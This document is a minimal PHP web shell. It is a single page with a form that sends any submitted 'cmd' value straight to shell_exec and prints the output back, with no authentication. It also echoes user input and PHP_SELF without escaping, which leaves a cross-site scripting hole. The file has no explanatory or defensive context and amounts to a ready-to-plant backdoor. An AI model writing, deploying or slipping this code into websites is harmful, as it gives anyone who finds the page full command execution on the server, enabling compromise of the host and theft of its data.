<?
	$page = $_SERVER["PHP_SELF"];
	$cmd = $_POST["cmd"];
	
	if(!empty($cmd)){
		$result = shell_exec($cmd);
		$result = str_replace("\n", "<br>", $result);
	}
?>

<form action="<?=$page?>" method="POST">
<input type="text" name="cmd" value="<?=$cmd?>">
<input type="submit" value="EXECUTE">
</form>
<hr>
<? if(!empty($cmd)) { ?>
<table style="border: 1px solid black; background-color: black">
<tr>
	<td style="color: white; font-size: 12px"><?=$result?></td>
</tr>
</table>
<? } ?>